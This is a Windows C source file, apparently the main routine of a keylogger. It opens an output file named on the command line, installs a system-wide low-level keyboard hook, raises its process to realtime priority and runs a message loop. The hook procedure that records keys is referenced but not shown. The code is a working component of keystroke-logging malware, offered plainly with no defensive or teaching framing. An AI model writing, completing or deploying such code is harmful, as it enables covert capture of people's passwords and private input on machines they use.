#include "../inc/main.h"

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR args, int nShow)
{
    extern WCHAR **__wargv;
    extern int __argc;

    con = AttachConsole(ATTACH_PARENT_PROCESS);

    if (con)
    {
        freopen("CON", "w", stdout);
        freopen("CON", "w", stderr);
        SetConsoleOutputCP(CP_UTF8);
    }
    // Make a multibyte copy of argv mainly for debugging
    PSTR *mbszArgv = malloc(sizeof(PSTR *) * __argc);

    if (mbszArgv == NULL)
    {
        if (con)
            fprintf(stderr, "Faild to allocate memory. Exiting with error: %d\n", GetLastError());
        return EXIT_FAILURE;
    }

    for (int i = 0; i < __argc; i++)
    {
        int wstrCharLen = wcslen(__wargv[i]);
        int mbstrByteLen = WideCharToMultiByte(CP_UTF8, 0, __wargv[i], wstrCharLen, NULL, 0, NULL, NULL);
        if (mbstrByteLen == 0)
        {
           fprintf(stderr, "Faild to translate arguments to multibyte. Exiting with error: %d\n", GetLastError());
           return EXIT_FAILURE;
        }
        
        mbszArgv[i] = malloc(mbstrByteLen + 1);
        if (mbszArgv[i] == NULL)
        {
            if (con)
                fprintf(stderr, "Faild to allocate memory. Exiting with error: %d\n", GetLastError());
            return EXIT_FAILURE;
        }

        WideCharToMultiByte(CP_UTF8, 0, __wargv[i], wstrCharLen, mbszArgv[i], mbstrByteLen, NULL, NULL);
        mbszArgv[i][mbstrByteLen] = '\0';
    }

    if (__argc != NUMARGS + 1)
    {
        if (con)
            printf_s("Usage: %s filePath \n", mbszArgv[0]);
        return EXIT_FAILURE;
    }

    hFile = CreateFileW(__wargv[1], FILE_WRITE_DATA, FILE_SHARE_READ, 0, OPEN_ALWAYS, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        if (con)
            fprintf(stderr, "Faild to open %s. Exiting with error: %d\n", mbszArgv[1], GetLastError());
        return EXIT_FAILURE;
    }

    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, llKeyProc, NULL, 0);
    if (hHook == NULL)
    {
        if (con)
            fprintf(stderr, "Faild to install hook. Exiting with error: %d", GetLastError());
        return EXIT_FAILURE;
    }

    SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    CloseHandle(hFile);

    for (int i = 0; i < __argc; i++)
        free(mbszArgv[i]);
    free(mbszArgv);

    return 0;
}